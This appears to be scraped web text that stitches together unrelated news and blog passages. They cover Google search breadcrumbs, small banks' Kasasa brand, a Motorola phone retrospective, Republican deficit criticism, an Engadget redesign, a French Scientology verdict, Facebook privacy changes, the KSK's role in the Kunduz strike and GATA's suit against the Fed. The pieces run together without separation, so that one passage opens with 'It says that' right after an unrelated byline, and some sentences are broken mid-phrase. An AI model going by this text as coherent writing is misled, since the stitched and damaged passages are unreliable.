These are standard navigational tools used throughout the web called " breadcrumbs , " which webmasters frequently show on their sites to help users navigate .
By analyzing site breadcrumbs , we 've been able to improve the search snippet for a small percentage of search results , and we hope to expand in the future .
When we design the way results appear on google.com , our goal is to get you to the information you 're looking for as quickly as possible .
Sometimes that means improving how we represent websites , and other times that means giving you new ways to explore content .

Even credit unions and small private banks , which have competed fiercely against one another for years , are banding together to combat the megabanks .
In early August , a group of officials representing more than 300 community banks and credit unions from across the country gathered in a ballroom in Dallas to hear about a new venture to combine their marketing budgets for the campaign .
The plan was created by BancVue , a consulting and marketing company for small banks .
Its aim is to bring new high - interest , no - fee checking accounts offered by small banks and credit unions nationwide under one brand , called “ Kasasa ”  a name made up after BancVue conducted extensive consumer marketing tests .
BancVue argues that smaller banks , by pooling their marketing resources , can attract deposits from larger institutions .
The idea for Kasasa came after customer studies suggested that most people preferred the personal service of a community bank , but were concerned they could not offer the same innovative products , like debit card rewards and name - brand credit cards , as the megabanks , said BancVue ’s chief executive , Gabriel Krajicek , who is based in Dallas .
Persuading a customer to switch banks is difficult .
“ It ’s easier to get a divorce than to change your checking account , ” Mr. Speed , the Texas banker , said .
But the recession has provided an opening for small banks to promote their relative stability .
According to the Federal Deposit Insurance Corporation , the federal agency that insures deposits , banks with less than $ 1 billion in assets remained the best capitalized in the industry , meaning they have adequate cash to absorb loan defaults .
And most smaller banks have continued to extend credit to consumers and small businesses , while big banks like Citigroup continue to cut back on their outstanding loan balances .
With the bankruptcy of the CIT Group , one of the biggest small - business lenders in the country , community banks sense even more opportunity to fill the void .
So far , the campaigns appear to be helping banks attract new customers .
According to an analysis by the Independent Community Bankers of America , small banks were the only segment of the industry to show growth in net loans and leases in the second quarter .

In case you havent heard , Google has finally taken steps to ban advertisers who promote links to scam sites . 
These types of sites and offers include crazy get - rich - quick schemes , teeth whiteners and weight loss products .
Previously , Google would simply take down an advertisement if it pointed to a sketchy site or violated any terms and conditions , in essence banning the advertisement , not the advertiser .
Obviously , this is pretty huge news , as Google is critically important to any internet marketer , and is more than likely the marketers largest source of traffic .
Aside from being news worthy , Googles actions illustrate an even larger point for those of us who are internet marketers : you have to focus on running a legitimate business .
Unfortunately , too many internet marketers have become modern day snake oil salesmen .
They pitch products they know nothing about , or worse , that they know wont live up to their outrageous claims , and try to scam as many people as possible in order to money .
Once one well runs dry , they simply pick up and move on to the next bogus product or niche .
Dont get me wrong , I m not trying to say affiliate marketing is wrong or immoral .
In fact , I do a fair amount of it myself , and I think I ’m a pretty ethical person .
The difference between a legitimate affiliate marketer and your run of the mill scam artist is a legitimate marketer qualifies the products they promote , provides honest and unbiased reviews , and the money is secondary ; a scam artist makes outrageous claims about products theyve likely never touched or used simply to make a quick sale .
So , if you ’re running an online business promoting your own or someone else ’s products , make sure you ’re doing it the right way , or you too may face a Google ban , or possibly something even worse .

( Pocket - lint ) - The company behind the world 's first commercial handheld mobile phone has certainly come a long way over the decades .
From brick phones big enough to tear your pocket to smartphones with rotating keyboards , Motorola has dabbled in everything .
Since 1983 , when the Dynatac 8000 x - aka the granddaddy of cellphones - burst onto the scene , Motorola has been making a wide range of mobile phones , messaging phones , clamshell phones , fashion phones , and smartphones .
Browsing through old pictures of Motorola devices , whether or not they were good products , is bound to open up a nostalgic floodgate for most people .
We 're taking a look back to show the most iconic , interesting and unusual Motorola devices from over the years .
Which of these do you remember ?
You 've seen this before .
If you have n't , you 're probably 12 .
It became the first cell phone to be offered commercially and is fondly remembered as an iconic part of the 1980s .
When it released , it was also considered a symbol of wealth and futurism .
Now it looks extremely archaic and almost comical , but this phone heralded the future of the modern smartphone .
The MicroTAC was the smallest and lightest phone available at the time and made headlines across the world .
It was truly portable and ended up in just about every music video throughout the late 1980s and early 1990s .
Ah , the " It " phone .
The StarTAC was the successor of the MicroTAC , a semi-clamshell phone that had been launched in 1989 .
The StarTAC was among the first mobile phones to gain widespread consumer adoption .
If you could n't afford the StarTAC in the 1990s , then you got the D160 .
It 's also remembered as being one of the first PAYG ( pay - as - you - go ) phones .
The i1000 plus was the world 's first handset to combine a digital phone , two - way radio , alphanumeric pager , Internet microbrowser , e-mail , fax and two - way messaging .
The Motorola Timeport is one of several candybar phones manufactured by Motorola .
Its design included an organic electroluminescent display , which was n't fully colour but included classic greens , blues and reds of the time .
The Timeport made its name by working on GSM 900MHz , 1800MHz and 1900MHz networks meaning it could work in the UK , most of Europe and the United States too .
This phone was the executive 's phone of choice at the time .
Described as a personal communicator as well as a phone , the V100 propelled the two - way messaging craze .
Vibration alerts , mono ringtones and a funky design made this one pretty popular .
Motorola and Cisco Systems supplied the world 's first commercial GPRS cellular network to BT Cellnet in the UK .
The Timeport P7389 i then became the first GPRS cellular phone .
The V70 certainly sported a pretty cool look .
This instantly recognisable design was considered a fashion phone back in its day .
A swivelling circular monochrome panel with a neon backlight keypad and interchangeable frames made this a pretty snazzy device from Motorola .
The Motorola V70 had a WAP browser , GPRS capabilities , a vibrating mode and voice dialling .
Often described as a cross between the StarTAC and V60 series , the T720 notably included customisation features .
Owners were able to change the phone 's front and black plates to customise the look of their device .
This phone was pretty boring for its time , but its simple design and cheap price tag made it the company ’s third highest - selling cellphone of all time .
The Motorola C200 was so well built that some users were claiming to still be using this phone , with its original battery , as late as 2011 .
The A760 was world 's first handset to combine a Linux operating system and Java technology with full PDA functionality .
Highlights of this device included a digital camera , video player , MP3 player , speakerphone , multimedia messaging and even Bluetooth technology .
This phone spearheaded the PTT ( push - to - talk ) craze .
It was a Nextel - operated device and became synonymous with the carrier .
It also boasted a fancy display capable of supporting up to 65,000 colours .
A classic flip phone loved by many .
Back in 2004 , we had plenty of good things to say about the Motorola RAZR .
Its extremely thin design made it stand out from the competition , and this particular model is now often associated with the entire Razr series .
A slim and metallic body spoke of the future of minimalistic smartphone design and saw this device being marketed as an exclusive fashion phone .
The RAZR proved wildly successful and Motorola sold over 50 million units by 2006 .
The Motorola PEBL was a classic clam - shell mobile phone that could be snapped open with one hand and featured a highly polished metal finish and a cool ( for the time ) appearance .
It supported the triband network , had a whopping 5 megabytes of memory and even sported a VGA camera .
The Motorola ROKR E1 saw Motorola pairing up with Apple to create a brand new device that would be the first phone to support iTunes syncing - the second one being the Apple iPhone in 2007 .
The Motorola ROKR E1 allowed users to take 100 tracks from their iTunes collection out and about with them .
This paled in insignificance when compared with the Apple iPod and a slow transfer rate resulted in a lack of appeal and lacklustre sales .
As a clamshell / flip phone , the KRZR was longer but narrower than the Motorola Razr .
The KRZR series kicked off with the K1 .
Motorola was trying to rejuvenate the success of the original RAZR with this new device that included a 2 - megapixel camera , an MP3 player and a snazzy design .
We thought it was certainly a safe upgrade from the RAZR , but hardly a radical and exciting departure .
The Motorola Q was a non-touchscreen phone that ran Windows Mobile 5.0 Smartphone Edition OS .
With the Motorola Q , the company was attempting to offer an alternative to BlackBerry that was incredibly popular with business folk of the time .
The Moto Q featured a QWERTY keyboard , integrated Bluetooth technology , EV - DO access , wireless sync for any time connectivity with email , calendar and contacts synchronisation as well as support for Microsoft Word , Excel , PowerPoint , and Adobe Acrobat .
But none of these features was enough to dethrone BlackBerry .
Known for its thin design , the L6 held the title of the thinnest mobile phone in the UK before the Samsung P300 came along .
The Motorola SLVR L6 was ideal for the fashionista on a budget ( as we put it in 2006 ) .
It had a few things going for it , but was n't without its flaws .
The Motorola Rizr Z8 featured an incredibly funky design for the time .
We enjoyed the tactile feel and the classic Motorola materials combined with the kick - slider design .
While other phones of the time were focused on music , the Motorola Rizr Z8 was pitched as a video device .
A screen that supported 16 million colours and 30 fps were the other highlights , as were the HSDPA connectivity , stereo Bluetooth , 2 - megapixel camera and an expandable microSD slot .
The Motorola Rokr E8 wanted to be everyone 's music player and that much was clear from the four - way music controls featured prominently on the design .
At the time , we thought the music sounded great , but it was n't the most advanced phone on the market and other features had suffered in favour of music capabilities .
Still , at least it had a 3.5 mm headphone jack .
The Motorola Aura bore a striking similarity to the V70 from a few years previous .
But this outlandish mobile represented an entry into the elite world of high - end mobile phones with a £ 1,400 price tag that puts even today 's flagships to shame .
Made from stainless steel , the Motorola Aura also boasted moving cogs and a circular screen protected by a Swiss - made lens .
This phone was well and truly about looks over functionality .
No Wi -Fi , 3G or microSD card slot and certainly no apps to speak of , but it did look pretty special .
The Motorola ZN5 saw Motorola pushing hard to regain the glory days of the RAZR .
This time Motorola collaborated with Kodak to release a device with a focus on photography .
This candybar style phone included a 5 - megapixel camera as well as optimisation for multimedia applications .
We found the ZN5 to be a bit underwhelming at the time , but it 's certainly another of Motorola 's more interesting devices .
The Motorola Droid was a multimedia - enabled smartphone that ran Google 's Android operating system .
The Droid launched with Android Eclair ( Android 2.0 ) and helped kick off one of the most successful mobile franchises in the world .
At the time , we thought the Motorola Droid was a fantastic device offering a state - of - the - art experience with flawless telephone reception to boot .
It was launched as the Motorola Milestone in other regions .
This device revamped the Droid series by ditching the huge , heavy design often associated with Droids in favour of a ( at that time , anyway ) slim design .
Despite this , it was still large and hardly the prettiest device around , but it did include an 8 - megapixel camera and excellent video capture too .
The Droid X certainly had a lot going for it and ran on Android 2.2 with Swype pre-installed , which made it interesting after the ditching of the slide out keyboard .
The Motorola Ming was a mobile phone sold in Hong Kong and China only .
It was part of a series of devices with interesting specifications , this model included a transparent clamshell cover and stylus pen .
Certainly quirky .
After a high - profile debut at CES 2011 , this device is ultimately remembered for its gimmicky laptop dock .
Motorola 's focus was on a device that put a computer in your pocket and came with a range of accessories too .
The Motorola ATRIX was likely the forefather of the current Moto Mods and showed that Motorola was n't afraid to innovate .
Resurrecting the Razr series , the Maxx had a long - lasting battery life and impressive Smart Actions software .
The Motorola Droid Razr Maxx once again saw Motorola trying to relive the hazy days of RAZR glory .
This new device might not have had the same style as the original device , but what it did have was a smashing battery - which lasted for as much as two days .
At the time , it was likely the best Android device to own , especially if you wanted it to last and last .
The lack of Android 4 at launch had many upset though .
A part of the Verizon Droid franchise , the Droid 4 is considered one of the last great QWERTY smartphones .
It supposedly perfected the mobile keyboard with responsive , tactile , and strong keys .
Motorola Moto X was Motorola 's first flagship after becoming a Google - owned company and as such , it was much anticipated and much sought after .
It was n't really much of a flagship though , aimed more at the mass market and designed to appeal to everyone it did n't have the bleeding edge specs many would hope for from a flagship device .
It did , however , offer customisation options and some funky aesthetics thanks to Moto Maker .
The Moto G launched in 2013 wanting to do something that other smartphones did n't do - bring all that power to emerging markets .
The Moto G started a trend , wanting to wipe - out feature phones and put Android in the pockets of those who previously could n't afford to own a smartphone .
It kickstarted a great family of Moto phones that 's still running today - and in many cases , still offers a great experience at the affordable end of the market .
The Nexus 6 saw Motorola going large with a Nexus device that moved into the phablet territory .
This phone had many saying it was " too big " but was also rejoiced for being a fantastic all - around smartphone running the latest version of Android that was always sure to appeal to true Android fans .
The Nexus 6 followed the design of the Moto X and it looked really good for it too .
We thought the Nexus 6 had plenty of power , good all - round performance and a solid build backed by an attractive design .
The Moto Z was all about mods - clip - on modules offering a variety of different highlights including speakers , improved cameras and much more .
This certainly made the phone stand out , but also assumed you 'd want to spend more money in order to accessorise your smartphone .
The Moto Z was n't a flagship device , but it was certainly interesting - and Moto Mods continued well beyond the original phone .
The Razr is back for 2019 and this time it 's a vision of the future .
The 2004 icon has been reinvented with a folding display , seeing a familiar clam shell design that effectively lets you fold your phone in half and slip it into your pocket .
It 's already attracting a lot of attention - as will the $ 1500 price .
It 's going to be available in early 2020 on Verizon and EE in the UK , pre-orders are open .
Writing by Adrian Willings and Maggie Tillman .
It says that all Republican senators are hypocrites who if they wish to avoid eternal damnation should resign their posts , give all they have to the poor , and take up a life of anonymous service to others :
Health care : Republican senators attacking the cost of a Democratic health care bill showed far different concerns six years ago , when they approved a major Medicare expansion that has added tens of billions of dollars to federal deficits ....
[ W ] hen Republicans controlled the House , Senate and White House in 2003 , they overcame Democratic opposition to add a deficit - financed prescription drug benefit to Medicare .
The program will cost a half - trillion dollars over 10 years , or more by some estimates ....
All current GOP senators , including the 24 who voted for the 2003 Medicare expansion , oppose the health care bill ....
Six years ago , " it was standard practice not to pay for things , " said Sen.
Orrin Hatch , R - Utah .
" We were concerned about it , because it certainly added to the deficit , no question . "
His 2003 vote has been vindicated , Hatch said , because the prescription drug benefit " has done a lot of good . "
Sen . George Voinovich , R - Ohio , said those who see hypocrisy " can legitimately raise that issue . "
But he defended his positions in 2003 and now , saying the economy is in worse shape and Americans are more anxious .
Sen. Olympia Snowe , R - Maine , said simply : " Dredging up history is not the way to move forward . "
She noted that she fought unsuccessfully to offset some of President George W. Bush 's deep tax cuts at the time .
But for now , she said , " it 's a question of what 's in this package , " which the Senate passed Thursday in a party - line vote .
The Senate bill still must be reconciled with a House version .
The political situation is different now , Snowe said , because " we 're in a tough climate and people are angry and frustrated . "
Some conservatives have no patience for such explanations .
" As far as I am concerned , any Republican who voted for the Medicare drug benefit has no right to criticize anything the Democrats have done in terms of adding to the national debt , " said Bruce Bartlett , an official in the administrations of Ronald Reagan and George H.W. Bush .
He made his comments in a Forbes article titled " Republican Deficit Hypocrisy . "
Bartlett said the 2003 Medicare expansion was " a pure giveaway " that cost more than this year 's Senate or House health bills will cost .
More important , he said , " the drug benefit had no dedicated financing , no offsets and no revenue - raisers .
One hundred % of the cost simply added to the federal budget deficit . " ...
Other lawmakers who voted for the 2003 Medicare expansion include the Senate 's top three Republican leaders , all sharp critics of the Obama - backed health care plans : Mitch McConnell of Kentucky , Jon Kyl of Arizona and Lamar Alexander of Tennessee .
Eleven Democratic senators voted with them back then ....
Bill Clinton 's administration was largely constrained by a pay - as - you - go law , requiring most tax cuts or program expansions to be offset elsewhere with tax increases and / or spending cuts .
Clinton ended his presidency with a budget surplus .
But it soon was wiped out by a sagging economy , the Iraq war , GOP tax cuts and the lapsing of the pay - as - you - go restrictions ....
Judy Feder , an analyst with the Democratic - leaning Center for American Progress , said these Republicans had their chance and blew it .
In the second Bush administration , she said , " there was a total elimination of any kind of pay - for responsibility . "
Those responsible should now show some humility , she said .
The homepage .
We 're really psyched on our new homepage .
Not only can we surface big features and major stories we cover up in the strip at the top of the site ( we call it the " hero module " ) , we 're also able to surface a bunch of important / timely stories in our Top Stories cluster , which lets us push news we think is of particular interest right into your first view , giving you an overview of the last few hours of tech news in a single glance ( you can also jump to the newest headline with just a click ) .
You 'll also note that we now have persistent navigation to all of the pages on the site ( many of which are brand new ) !
New sidebar modules .
We 've totally revamped all of our sidebars and mini-content views .
It would take a long time to go into all of the new functionality over there , but we 're hooking into the site in all kind of new ways , and working to deliver better , more relevant content to readers .
These will be updated frequently , and added to as time goes on , so keep your eyes to the right .
Hubs .
You 've seen the basic hubs we used to have on the old Engadget , but we 've totally juiced the new ones with more content and more dynamic ways of showing context .
We 're grouping our hubs into three main sections : products , topics , and events .
The topic and event hubs include one of our favorite tools , the " Follow the saga " module , which lets you view a timeline of a product over weeks , months , and years .
It 's really cool -- check it out !
Also , we plan on utilizing the event hubs for ongoing events , giving you a feed of our liveblog , while dynamically updating the content on that page .
It will be truly awesome -- just wait .
Proper video and gallery pages .
Pretty simple , but we 're really happy to have a place where you can peruse all of that extra content in a useful and enjoyable manner .
New topics page with content sorting .
Kinda says it all -- super easy way to find what you 're looking for in any category .
Better via and sourcing ... and More Coverage .
Vias and sources are now clearly displayed with the name of the sites where our stories are coming from , making it super simple to follow the breadcrumbs .
Doubleplus good ?
We 've added a new feature called More Coverage , which lets us aggregate links related to what we 're reporting on .
We 're really psyched about this -- it gives us a chance to direct readers to stories that take a different angle on the news , go deeper , or we think are just plain worth reading .
You 'll start to see this all over the place , because we want to not just be a source for news , but a resource as well .
Improved search .
Our search tool still is n't Google level or anything , but we 're now able to return not only relevant search results , but tag results and galleries .
We suggest single word searches for the best results , but try phrases ... you may get lucky !
Archives .
This one is especially awesome to us .
See that calendar on the right side ?
Click on a date -- you 'll get that full day 's news , plus a really cool visualization -- something we call The Recap -- of the stories of the day crossed by time and comment activity .
We think it 's not only a nice looking piece of functionality , but helps give you a better idea of our ebb and flow of posts .
We 'll also be transporting that module to places like our daily roundup , allowing us to give you a better picture of where the news went that day in a more concise and clear manner .
First and foremost , the new Engadget is built from a collaboration between the editorial / developer team here , and the amazing , genius designers at Code & Theory -- a group responsible for sites such as The Daily Beast and Interview .
We brought our huge stack of concepts and ideas to Code & Theory , and they managed to distill our dreams into reality .
We tip our hats to the men and women there who focused what we wanted into the site you see today ; their contribution to our new look and feel cannot be overstated .
Secondly -- but certainly not any less important -- are the teams on our side that put this thing together .
Justin Glow and Dan Chilton ( our resident developers ... well Justin is on loan from Joystiq ) took the beautiful skin that Code &
Theory created and built the bones and guts with wildly creative code that we 're using all over the place ( really , everywhere ) .
They upended what we thought was possible with our platform and our site ; there is no way to accurately describe how instrumental they were in our relaunch , except to say this site would n't be here today without them .
Amidst all the other work going on , the WIN design team helped put all the puzzle pieces into place , solved issues that had us scratching our heads , and made sure we were shipshape for launch .
Team Blogsmith , the stewards of the amazing platform Engadget runs atop of , made some killer and clutch changes that let us make some of the magic you 're seeing on the page .
Without them , the new Engadget would have been only a dream !
The biggest change of all is probably the fact that we 've somewhat merged our three main sites together .
That is to say , where Engadget Mobile and Engadget HD were totally separate entities before , we 're now able to share more content across the sites and allow for readers to more easily jump between the properties .
We 'll no longer have duplicate posts on the three sites either -- one post will exist , and will appear on whatever site is appropriate , perfectly syncing comments , galleries , and links .
That has benefits beyond the front page , too .
It means we can offer RSS feeds for all which omit duplicate stories , or give you a super feed of every story posted to every site , so there 's no way you 'll miss any piece of news .
Keep in mind , Mobile and HD will keep their unique content and identity , but the new system will be somewhat different and might take a little adjusting to .
We 're confident that once you see how the sites play together , you 'll love it as much as we do .
Besides that , we 've got a bunch of new content and navigation here as well .
We 're figuring that most of you will just start clicking around like maniacs to check out what we 've done ( we do n't read manuals either ) , but here 's a few highlights anyway : You 'll notice some changes to comments which should make using the system and carrying on a conversation way more pleasant .
The first and probably biggest change is that we now have persistent logins , and permanent , dedicated usernames .
That means two things ; firstly , you canwhich will beand , meaning you get to have a real identity here ( and that no one can take or duplicate your name once you 've chosen it ) .
Secondly , persistent logins mean you can just login at the top of the site ( up in the header ) once ( like a real website ! ) , and comment to your heart 's content .
While both of these things are totally radical , you 'll need to do a couple of things to get started .
First , when you login with your current account , you should be prompted to pick a username .
When selecting a username , take care to grab exactly what you want ( using letters and numbers only , no special characters , and not case sensitive ) .
You 'll have that name forever .
Since these are unique , they 're pretty much first come first served , which means if you want to grab John Smith , you better get to the party early .
No matter what , we can't help you get a username you want -- you have to come and register it and hope that it 's available .
Furthermore , there is the possibility that your old cookies may log you in without letting you pick a new username .
That 's bad because your account becomes unverified ( as you can see ) , which means your name wo n't display in comments at all , and we 'll eventually delete all unclaimed accounts ( the comments will stay , but the login info will no longer work and you 'll have to create a new account ) .
The easiest way to correct this issue is to just jump to www.engadget.com/login ( or the header up top ) and logout .
When you log back in with your CURRENT CREDENTIALS , you 'll be asked to pick a new username , and boom : you 're in .
It 's as simple as that .
Again , we can't guarantee that you guys will get the exact name you want , but you 're pretty creative -- we know you 'll do okay .
Other than that , you 'll see we 've changed the look and feel of comments , and made some real improvements that make it easier to carry on a real conversation .
We now provide " reply " links at the bottom of every comment , which means that you 're actually answering the person you want to answer .
On top of that , the comment will begin with an @username ( do n't worry , you can erase it ) , which specifically calls out the person you 're talking to .
It 's a little Twitterism that we think is pretty handy here .
You should also find that those annoying bugs with misplaced comments have left the building .
We 've changed the display of comments too -- now when you downrank someone ( as we know you guys love to do ) , their comment just disappears .
For all the trolls out there , prepare to have your hearts broken .
Also , we 've made it so that the editors of the site can't be ranked at all .
We think that it 's important that everyone who reads the site can see what they have to say , and this is the most effective way to do that .
The team at Engadget , as well as Justin and Dan , WIN design , Blogsmith , Code & Theory , and a score of folks at AOL have been working tirelessly on this project for some considerable time .
We 've put a lot of blood , sweat , and tears into this , and it 's incredible to finally take the wraps off !
Let me switch to the first person here for a moment .
I just want to say a huge " thank you " to some specific folks who have supported this and helped make it happen .
First and foremost is Josh Fruhlinger , the editorial director of the AOL Tech Network -- without him I am positive we never would have gotten this site relaunched , or done all the amazing things we 've done with it .
He has been instrumental in this project from day one .
I 'd also like to thank Marty Moe and Bill Wilson at AOL , who supported us from the get - go and trusted us to do what we wanted .
Brad Hill , the director of Weblogs , Inc. was also incredibly supportive and positive about this and has been a great friend and champion of the site and our vision through this process .
I also want to thank Victor Hasemen at AOL and Rob Sandie at Viddler for their vigilance on getting video right for the site .
One last person I would like to single out who has been incredibly gracious , patient , and helpful during this is Joystiq 's Editor - in - chief Chris Grant .
Not only did he allow us to yank Justin Glow on - board for this project , but he 's helped me from day one with planning , visualizing , and executing some of these ideas we 've had .
Lastly , I want to thank you guys -- the readers -- for reading this site through the years , and not just reading , but coming back for more and in greater numbers .
At the end of the day , this thing is for you , and we hope that you enjoy the new site as much as we do .
That said , we 're open to any suggestions or comments on ways we can improve the experience or offer more .
We view this as an iterative process , so we 're not planning on stopping here at all .
In fact , we 're just getting things started .

Paris , France ( CNN ) -- A French court 's verdict against the Church of Scientology amounts to a " modern Inquisition " and threatens freedom of religion in France , a senior Scientologist said Tuesday .
Eric Roux , a spokesman for the group and an official representative of the organization 's Celebrity Center , also said the church would appeal Tuesday 's verdict .
A three - judge panel at the Correctional Court in Paris convicted the church and six of its members of organized fraud , but stopped short of banning the church , as prosecutors had asked .
The court also fined the members as much as 400,000 euros ( $ 595,000 ) each and sentenced them to as much as two years in prison , though the sentences were suspended .
The decision follows a three - week trial in May and June , during which two plaintiffs said they were defrauded by the organization , which is classified as a sect in France .
Scientology has about 45,000 followers in France , and some of them were in court Tuesday .
" We think that this is really a modern Inquisition and that this is really dangerous for the freedom of religion in our country , and for sure we do not agree with that and we will go to appeal , " Roux told CNN .
One of the judges on the panel said the church may continue its activities in France , but she said those activities must remain " on the correct side of the law . "
As part of the penalties , the church was ordered to publish the results of the verdict in several national and international magazines to warn people , the judge said , about what Scientology offers and what was discovered at trial .
" It 's an empty case , " Roux said .
" It 's run like an Inquisition , ( as ) if some people did not wake up from the Inquisition time . "
The plaintiffs focused their complaints on the use of a device that Scientologists say measures spiritual well - being .
Members used the electropsychometer , or E - Meter , to " locate areas of spiritual duress or travail so they can be addressed and handled , " according to Scientology 's Web site .
The plaintiffs said that , after using the device , they were encouraged to pay for vitamins and books .
They said that amounted to fraud .
Roux said Scientology is doing well in Europe , and he specifically mentioned Spain , Britain , and Sweden .
He said a church opening in Rome , Italy , last weekend attracted 6,000 people .
" This is expansion , and people want to support the church , " he said , when asked about members being asked to pay money .
" We are 12 million in the world , and this 12 million want to support the church , and that 's what they do . "
He said France was a special case within Europe .
" You have in France a clique of anti-religious extremists that are making a lot of noise , " he said .
CNN 's Jim Bittermann contributed to this report .
Facebook is one of the world 's most popular social networking sites Facebook has agreed to make worldwide changes to its privacy policy as a result of negotiations with Canada 's privacy commissioner .
Last month the social network was found to breach Canadian law by holding on to users ' personal data indefinitely .
Facebook has now agreed to make changes to the way it handles this information and be more transparent about what data it collects and why .
It will also make it clear that users can deactivate or delete their account .
" These changes mean that the privacy of 200 million Facebook users in Canada and around the world will be far better protected , " said Canadian privacy commissioner Jennifer Stoddart .
" We 're very pleased Facebook has been responsive to our recommendations . "
The decision could also have implications for other social networking websites , she said .
Elliot Schrage , vice president of global communications and public policy at Facebook , said he believed the new policies set " a new standard for the industry " .
' Unrestricted access '
As well as updating the privacy policy , Facebook has said it will make changes that will give users more control over the data they provide to third - party developers of applications , such as games and quizzes .
There are around 950,000 developers in 180 countries who provide applications for the site .
Specifically , the changes will require applications to state which information they wish to access and obtain consent from the user before it is used or shared .
" Application developers have had virtually unrestricted access to Facebook users ' personal information , " said Ms Stoddart .
" The changes Facebook plans to introduce will allow users to control the types of personal information that applications can access . "
The site will also encourage users to review their privacy settings and make it clear to users that they can delete or deactivate an account , and what the difference is between the two .
Facebook 's Michael Richter said if a user chose to deactivate their account , the site would still store their information " even if it is for 10 years " .
" We 're committing to that user , " he said .
" We want them to know that if they change their mind they can always come back . "
The social network has said work on the changes will begin immediately but they would take around 12 months to implement .
The regulator first started its investigation as a result of complaints by the Canadian Internet Policy and Public Interest Clinic ( CIPPIC ) at the University of Ottawa .
The country is the first to complete a full investigation of Facebook 's privacy practices .
Canada has around 12 million Facebook users , more than one in three of the population .

Secret documents from the Military Police report .
They show which information was sent from Afghanistan to the Bundeswehr Operational Command in Potsdam .
One says : " Only the inner circle to have knowledge of these procedures .
No passing on to third parties . "
German Special Forces were involved in the controversial Kunduz air strike which caused the deaths of 142 people , it has been revealed .
What is the KSK ?
The Kommando Spezialkräfte ( KSK ) is the elite unit of the Bundeswehr .
It was formed in 1996 and is based in Calw in Baden - Württemberg .
The unit consists of 1,100 men , with around 400 in the commando companies .

More news Fatal accident in Turkey Coa mine explosion and collapse leaves 19 dead Turkey has been hit by a fatal accident as an explosion and collapse at a coal mine leaves at least 19 people dead , according to a Minister .
More details are still emerging about the deadly bombing in Afghanistan following the resignation of former Defence Minister Franz Josef Jung after a cover up .
It has now come to light that the elite Kommando Spezialkräfte ( KSK ) unit played a role in the attack on September 4 which killed 142 people including civilians .
BILD can reveal how the KSK intervened in the strike on two fuel tanker trucks in an overnight covert operation .
At least five officers and NCOs advised Colonel Georg Klein , commander of the German military forces in the Kunduz region .
All five belonged to a secret unit codenamed Task Force 47 , or TF47 , which had Colonel Klein as its presumptive head .
TF47 comprises approximately half of the KSK soldiers , whose goal is to hunt for Taliban leaders and terrorists .
The unit has its own command centre with advanced equipment at the German camp in Kunduz .
The first tip arrived from an Afghan informant on the evening of September 3 .
The Taliban had reportedly hijacked two gasoline tanker trucks which had then become stuck on a sandbank six kilometres from the German camp .
TF 47 soldiers requested help from an American B1B bomber .
In the 90 minutes it took the plane to locate the tanker trucks , Colonel Klein was called to the TF47 command post .
During the night Colonel Klein took over as acting commander of TF47 .
An internal review by the Bundeswehr said that according to NATO rules , Klein would be allowed to order an attack only in this role .
A TF47 officer spoke approximately seven times by phone throughout the night with the Afghan informant who identified four of the Taliban leaders who were with the tankers , as well as other details .
Although the soldier still remains unnamed he was questioned at length by both NATO and German military police investigators .
The fact that he has remained anonymous is directly related to his KSK membership status .
At the TF47 command post , a KSK man led the secret mission protocol .
The new information verifies a previously unknown fact that the elite forces played an important role .
In the first military police report drawn up immediately after the bombing , it was not apparent from the documents which people contributed to decision - making on the night of attack .
The TF47 mission protocol will be withheld from NATO investigators due to German national security issues .
Task Force 47 is mentioned in the 575 - page secret NATO Final Report , but without any reference to the KSK .
According to information provided to BILD , then - Defence Minister Franz Josef Jung was informed of the KSK ’s participation but did not make this knowledge public .
What does his successor have to say about the new details ?
A spokesman for Karl - Theodor zu Guttenberg told BILD : “ Task Force 47 was also the subject of the briefing to the co-ordinators of the Defence Committee on November 6 . ”
The fact that a unit of elite KSK troops was serving with TF47 was not mentioned .
Karim Popal , a lawyer and advocate for the victims , told the Hannover ‘ Neue Presse ’ newspaper that there were at least 137 civilian victims killed , as well as 22 missing and 20 injured .
“ We alone have registered 91 widows of victims of the bombardment as well as 163 orphans . ”
Popal spent six weeks in Kunduz investigating the incident along with fellow lawyers , and said he was absolutely certain his team ’s research was correct .
“ We have identification documents of victims and relatives and we are also prepared to conduct DNA tests . ”
No one wanted “ money to flow to the Taliban ” , explained the lawyer , who is from Bremenand of Afghan origin .
“ It is about helping the families , helping the widows and the many orphans . ”

Our friends at GATA have had enough of the Fed's , and other Central Banks ' alleged ( and with so much circumstantial evidence presented both at Zero Hedge and elsewhere , that in this case " alleged " is just a term only a lawyer could love ) manipulation of gold prices , and have taken Bernanke 's monetization , manipulation and money making unlimited liability company to task ( " M4 ULLC " ) .
We are overjoyed that yet another entity has followed in the footsteps of our dear late friend Mark Pittman in taking on the one organization that represents all that is irreconcilably broken with the current economic and financial system .
We wish GATA much success , and hope that ever more wronged counterparties will seek remedies from the Fed 's consistent and blatant wealth transfer from America 's Middle Class to the uber - wealthy , Wall Street - originating oligarchy .
GATA notes :
GATA today brought suit against the U.S. Federal Reserve Board , seeking a court order for disclosure of the central bank 's records of its surreptitious market intervention to suppress the monetary metal 's price .
The suit was filed in U.S. District Court for the District of Columbia and targets
Fed records involving gold swaps , exchanges of gold with foreign financial institutions .
In a letter dated September 17 this year to GATA 's law firm , William J. Olson P.C. of Vienna , Virginia , ( http://www.lawandfreedom.com)
Fed Board of Governors member Kevin M. Warsh acknowledged that the Fed has gold swap agreements with foreign banks but insisted that such documents remain secret :
http://www.gata.org/files/GATAFedResponse-09-17-2009.pdf
The lawsuit follows two years of GATA 's efforts to obtain from the Federal Reserve and the U.S. Treasury Department a candid accounting of the U.S. government 's involvement in the gold market .
These efforts parallel those of U.S. Rep. Ron Paul , R - Texas , who long has been proposing legislation to audit the Fed .
The Fed has wrapped in secrecy much of its massive intervention in the markets over the last year , and Paul 's legislation recently was approved by the U.S. House of Representatives .
The Fed claims that its gold swap records involve " trade secrets " exempt from disclosure under the U.S. Freedom of Information Act .
While GATA has produced many U.S. government records showing both open and surreptitious intervention in the gold market in recent decades ( see http://www.gata.org/node/8052), Fed Governor Warsh 's letter is confirmation that the government is surreptitiously operating in the gold market in the present as well .
That intervention constitutes a huge deception of financial markets as well as expropriation of precious metals miners and investors particularly .
This deception and expropriation are what GATA was established in 1999 to expose and oppose .
Of course GATA 's lawsuit against the Fed will take months if not years to resolve .
We think we have a good chance of winning it in court .
But we can win it outside court , and much sooner , if the suit can gain enough publicity from the financial news media and market analysts and prompt enough inquiry from them and from the public , the mining industry , and members of Congress .
So GATA urges its friends to publicize the suit and to urge journalists , market analysts , mining companies , and members of Congress to join us in seeking disclosure of the Fed 's gold market intervention records .
If enough clamor is directed at the Fed about these records , the gold price suppression scheme will lose its surreptitiousness and fail .
